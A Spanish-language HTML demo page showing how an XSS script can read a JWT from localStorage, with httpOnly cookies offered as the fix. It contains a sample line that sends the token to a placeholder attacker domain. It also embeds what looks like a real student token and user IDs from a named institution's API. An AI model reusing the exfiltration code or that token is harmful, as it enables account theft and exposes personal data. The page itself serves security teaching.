<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîì Demo de Vulnerabilidad XSS con localStorage</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
        }

        .card {
            background: white;
            border-radius: 10px;
            padding: 30px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
        }

        .warning {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }

        .danger {
            background: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }

        .success {
            background: #d4edda;
            border-left: 4px solid #28a745;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }

        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 5px;
            transition: background 0.3s;
        }

        button:hover {
            background: #5568d3;
        }

        button.danger-btn {
            background: #dc3545;
        }

        button.danger-btn:hover {
            background: #c82333;
        }

        .code {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
        }

        .result {
            background: #f8f9fa;
            border: 2px solid #667eea;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
            min-height: 50px;
        }

        .section {
            margin: 30px 0;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            margin: 10px 0;
        }

        .step {
            background: #f8f9fa;
            padding: 20px;
            margin: 15px 0;
            border-radius: 5px;
            border-left: 4px solid #667eea;
        }

        .step h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>üîì Demostraci√≥n de Vulnerabilidad XSS</h1>
            <p style="color: #666; margin-top: 10px;">
                Esta p√°gina demuestra por qu√© NO debes almacenar tokens en localStorage
            </p>

            <div class="warning">
                <strong>‚ö†Ô∏è SOLO PARA PROP√ìSITOS EDUCATIVOS</strong><br>
                Esta demostraci√≥n muestra vulnerabilidades reales. √ösala solo para aprender.
            </div>
        </div>

        <!-- Paso 1: Simular Login -->
        <div class="card">
            <div class="step">
                <h3>Paso 1Ô∏è‚É£: Simular Login (M√©todo VULNERABLE)</h3>
                <p>Simulamos un login que almacena el token en localStorage</p>

                <button onclick="simulateLogin()">üîê Simular Login con localStorage</button>

                <div class="code" style="margin-top: 15px;">
localStorage.setItem('eva-tk', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
                </div>

                <div id="loginResult" class="result" style="display: none;">
                    <strong>‚úÖ Login exitoso!</strong><br>
                    Token almacenado en localStorage
                </div>
            </div>
        </div>

        <!-- Paso 2: Demostrar robo de token -->
        <div class="card">
            <div class="step">
                <h3>Paso 2Ô∏è‚É£: Demostrar Ataque XSS</h3>
                <p>Un atacante inyecta c√≥digo JavaScript malicioso:</p>

                <button onclick="stealToken()" class="danger-btn">
                    üòà Ejecutar Script Malicioso (XSS)
                </button>

                <div class="code" style="margin-top: 15px;">
// C√≥digo inyectado por el atacante
const token = localStorage.getItem('eva-tk');
fetch('https://atacante.com/steal?token=' + token);
                </div>

                <div id="xssResult" class="result" style="display: none;"></div>
            </div>
        </div>

        <!-- Paso 3: Analizar token robado -->
        <div class="card">
            <div class="step">
                <h3>Paso 3Ô∏è‚É£: Analizar Token Robado</h3>
                <p>El atacante ahora puede decodificar el token:</p>

                <button onclick="analyzeToken()">üîç Decodificar Token</button>

                <div id="tokenAnalysis" class="result" style="display: none;"></div>
            </div>
        </div>

        <!-- Paso 4: Usar token robado -->
        <div class="card">
            <div class="step">
                <h3>Paso 4Ô∏è‚É£: Usar Token Robado</h3>
                <p>El atacante puede hacer peticiones como si fuera el usuario:</p>

                <button onclick="useStolentToken()" class="danger-btn">
                    üé≠ Suplantar Identidad
                </button>

                <div id="impersonationResult" class="result" style="display: none;"></div>
            </div>
        </div>

        <!-- Soluci√≥n -->
        <div class="card">
            <div class="step">
                <h3>‚úÖ Soluci√≥n: httpOnly Cookies</h3>
                <p>La forma segura de almacenar tokens:</p>

                <div class="success">
                    <strong>‚úì Ventajas de httpOnly cookies:</strong><br>
                    ‚Ä¢ No accesible por JavaScript<br>
                    ‚Ä¢ Protecci√≥n contra XSS<br>
                    ‚Ä¢ Enviada autom√°ticamente con cada petici√≥n<br>
                    ‚Ä¢ Puede tener SameSite para prevenir CSRF
                </div>

                <div class="code">
// Backend (Node.js/Express)
res.cookie('eva-tk', token, {
  httpOnly: true,      // ‚Üê NO accesible por JS
  secure: true,        // ‚Üê Solo HTTPS
  sameSite: 'strict',  // ‚Üê Protecci√≥n CSRF
  maxAge: 3600000      // ‚Üê 1 hora
});
                </div>

                <button onclick="demonstrateSecure()">
                    üõ°Ô∏è Demostrar M√©todo Seguro
                </button>

                <div id="secureDemo" class="result" style="display: none;"></div>
            </div>
        </div>

        <!-- Comparaci√≥n -->
        <div class="card">
            <h2>üìä Comparaci√≥n de M√©todos</h2>

            <table style="width: 100%; border-collapse: collapse; margin-top: 20px;">
                <thead>
                    <tr style="background: #f8f9fa;">
                        <th style="padding: 12px; text-align: left; border-bottom: 2px solid #dee2e6;">Caracter√≠stica</th>
                        <th style="padding: 12px; text-align: center; border-bottom: 2px solid #dee2e6;">localStorage</th>
                        <th style="padding: 12px; text-align: center; border-bottom: 2px solid #dee2e6;">httpOnly Cookie</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td style="padding: 12px; border-bottom: 1px solid #dee2e6;">Accesible por JavaScript</td>
                        <td style="padding: 12px; text-align: center; border-bottom: 1px solid #dee2e6;">‚ùå S√≠ (vulnerable)</td>
                        <td style="padding: 12px; text-align: center; border-bottom: 1px solid #dee2e6;">‚úÖ No</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border-bottom: 1px solid #dee2e6;">Vulnerable a XSS</td>
                        <td style="padding: 12px; text-align: center; border-bottom: 1px solid #dee2e6;">‚ùå S√≠</td>
                        <td style="padding: 12px; text-align: center; border-bottom: 1px solid #dee2e6;">‚úÖ No</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border-bottom: 1px solid #dee2e6;">Enviada autom√°ticamente</td>
                        <td style="padding: 12px; text-align: center; border-bottom: 1px solid #dee2e6;">‚ùå No</td>
                        <td style="padding: 12px; text-align: center; border-bottom: 1px solid #dee2e6;">‚úÖ S√≠</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border-bottom: 1px solid #dee2e6;">Expira autom√°ticamente</td>
                        <td style="padding: 12px; text-align: center; border-bottom: 1px solid #dee2e6;">‚ùå No</td>
                        <td style="padding: 12px; text-align: center; border-bottom: 1px solid #dee2e6;">‚úÖ S√≠</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border-bottom: 1px solid #dee2e6;">Protecci√≥n CSRF</td>
                        <td style="padding: 12px; text-align: center; border-bottom: 1px solid #dee2e6;">‚ùå No</td>
                        <td style="padding: 12px; text-align: center; border-bottom: 1px solid #dee2e6;">‚úÖ Con SameSite</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <!-- Recursos -->
        <div class="card">
            <h2>üìö Recursos para Aprender M√°s</h2>
            <ul style="margin: 15px 0 0 20px; line-height: 2;">
                <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP - Cross Site Scripting (XSS)</a></li>
                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html">OWASP - HTML5 Security</a></li>
                <li><a href="https://tools.ietf.org/html/rfc6265">RFC 6265 - HTTP State Management (Cookies)</a></li>
                <li><a href="https://jwt.io/introduction">JWT Introduction</a></li>
            </ul>
        </div>
    </div>

    <script>
        const DEMO_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYTE5MDAyOTU5IiwiaWRhIjoxMzYzODIyLCJpZHUiOjIzNjgxMiwidGlwIjoxLCJmaSI6IjE3NTc5MTI0MDAwMDAiLCJmZiI6IjE3NjYyOTMyMDAwMDAiLCJjb24iOiJDTSIsInNlZCI6IkxOIiwiaWR1ZyI6MCwiaWR1Z2EiOjAsIm1hdCI6Ijc0NDg1NiIsIm1hciI6MSwiY29tYXIiOiJJREFUIiwibmJmIjoxNzYzNTk2MDk2LCJleHAiOjE3NjM3Njg4OTYsImlhdCI6MTc2MzU5NjA5NiwiaXNzIjoiaHR0cHM6Ly9hcGkuaWRhdC5lZHUucGUiLCJhdWQiOiJodHRwczovL2FwaS5pZGF0LmVkdS5wZSJ9.O4gVul93ZwpxFiZIT6-D7k6QT0F_gKHhtAcFrFnPQEM";

        function simulateLogin() {
            // Almacenar token en localStorage (VULNERABLE)
            localStorage.setItem('eva-tk', DEMO_TOKEN);

            const result = document.getElementById('loginResult');
            result.style.display = 'block';
            result.innerHTML = `
                <strong>‚úÖ Login exitoso!</strong><br>
                Token almacenado en localStorage<br>
                <code style="word-break: break-all; font-size: 12px; display: block; margin-top: 10px; background: white; padding: 10px; border-radius: 5px;">
                    ${DEMO_TOKEN.substring(0, 100)}...
                </code>
            `;

            console.log('üîì Token almacenado (VULNERABLE):', DEMO_TOKEN);
        }

        function stealToken() {
            // Simular script malicioso que roba el token
            const stolenToken = localStorage.getItem('eva-tk');

            const result = document.getElementById('xssResult');
            result.style.display = 'block';

            if (stolenToken) {
                result.innerHTML = `
                    <strong>üòà ¬°Token robado exitosamente!</strong><br>
                    <span style="color: #dc3545;">Esto demuestra que cualquier script puede leer localStorage</span><br><br>
                    <strong>Token completo:</strong><br>
                    <code style="word-break: break-all; font-size: 12px; display: block; margin-top: 10px; background: white; padding: 10px; border-radius: 5px;">
                        ${stolenToken}
                    </code><br>
                    <span style="color: #666; font-size: 14px;">
                        ‚ö†Ô∏è En un ataque real, este token se enviar√≠a a un servidor del atacante
                    </span>
                `;

                console.log('üòà Token robado:', stolenToken);
                console.log('üíÄ Enviando a: https://atacante.com/steal?token=' + stolenToken);
            } else {
                result.innerHTML = `
                    <strong>‚ùå No hay token para robar</strong><br>
                    Primero simula el login en el Paso 1
                `;
            }
        }

        function decodeJWT(token) {
            try {
                const parts = token.split('.');
                const header = JSON.parse(atob(parts[0]));
                const payload = JSON.parse(atob(parts[1]));
                return { header, payload };
            } catch (e) {
                return null;
            }
        }

        function analyzeToken() {
            const token = localStorage.getItem('eva-tk');
            const result = document.getElementById('tokenAnalysis');
            result.style.display = 'block';

            if (!token) {
                result.innerHTML = '<strong>‚ùå No hay token. Primero simula el login.</strong>';
                return;
            }

            const decoded = decodeJWT(token);
            if (decoded) {
                result.innerHTML = `
                    <strong>üîç Informaci√≥n extra√≠da del token:</strong><br><br>
                    <div style="background: white; padding: 15px; border-radius: 5px; margin-top: 10px;">
                        <strong>Header:</strong><br>
                        <code>${JSON.stringify(decoded.header, null, 2)}</code><br><br>
                        <strong>Payload (Datos del usuario):</strong><br>
                        <code style="color: #dc3545;">${JSON.stringify(decoded.payload, null, 2)}</code>
                    </div><br>
                    <span style="color: #dc3545; font-weight: bold;">
                        ‚ö†Ô∏è El atacante ahora tiene acceso a todos tus datos!
                    </span>
                `;

                console.log('üîç Token decodificado:', decoded);
            }
        }

        function useStolentToken() {
            const token = localStorage.getItem('eva-tk');
            const result = document.getElementById('impersonationResult');
            result.style.display = 'block';

            if (!token) {
                result.innerHTML = '<strong>‚ùå No hay token. Primero simula el login.</strong>';
                return;
            }

            // Simular petici√≥n con el token robado
            result.innerHTML = `
                <strong>üé≠ Suplantaci√≥n de identidad exitosa!</strong><br>
                <span style="color: #dc3545;">El atacante puede hacer peticiones como si fuera t√∫</span><br><br>
                <div style="background: white; padding: 15px; border-radius: 5px; margin-top: 10px;">
                    <strong>Petici√≥n simulada:</strong><br>
                    <code style="display: block; margin-top: 10px;">
fetch('https://api.idat.edu.pe/datos-usuario', {
  headers: {
    'Authorization': 'Bearer ${token.substring(0, 30)}...'
  }
})
                    </code>
                </div><br>
                <span style="color: #666;">
                    üíÄ Acciones posibles del atacante:<br>
                    ‚Ä¢ Ver tus datos personales<br>
                    ‚Ä¢ Modificar tu informaci√≥n<br>
                    ‚Ä¢ Hacer acciones en tu nombre<br>
                    ‚Ä¢ Robar informaci√≥n sensible
                </span>
            `;

            console.log('üé≠ Usando token robado para hacer peticiones...');
        }

        function demonstrateSecure() {
            const result = document.getElementById('secureDemo');
            result.style.display = 'block';

            result.innerHTML = `
                <strong>üõ°Ô∏è M√©todo Seguro - httpOnly Cookie</strong><br><br>
                <div style="background: white; padding: 15px; border-radius: 5px;">
                    <strong>Intento de robo:</strong><br>
                    <code style="display: block; margin-top: 10px; color: #dc3545;">
> document.cookie<br>
""  // ‚Üê Cookie no accesible por JavaScript!
                    </code><br>
                    <strong>Resultado:</strong><br>
                    <code style="display: block; margin-top: 10px; color: #28a745;">
‚úÖ Cookie protegida - JavaScript no puede acceder<br>
‚úÖ Solo el navegador puede enviarla al servidor<br>
‚úÖ XSS no puede robar el token
                    </code>
                </div><br>
                <div class="success" style="margin-top: 15px;">
                    <strong>‚úì Beneficios:</strong><br>
                    ‚Ä¢ Inmune a ataques XSS<br>
                    ‚Ä¢ Manejada autom√°ticamente por el navegador<br>
                    ‚Ä¢ Puede configurarse para expirar autom√°ticamente<br>
                    ‚Ä¢ Protecci√≥n CSRF con flag SameSite
                </div>
            `;

            console.log('üõ°Ô∏è httpOnly cookie - Protegida contra XSS');
        }

        // Log inicial
        console.log('%c‚ö†Ô∏è DEMOSTRACI√ìN DE VULNERABILIDAD XSS', 'font-size: 20px; color: red; font-weight: bold;');
        console.log('%cEsta p√°gina demuestra por qu√© NO debes usar localStorage para tokens', 'font-size: 14px;');
        console.log('%cSigue los pasos para ver la vulnerabilidad en acci√≥n', 'font-size: 14px;');
    </script>
</body>
</html>
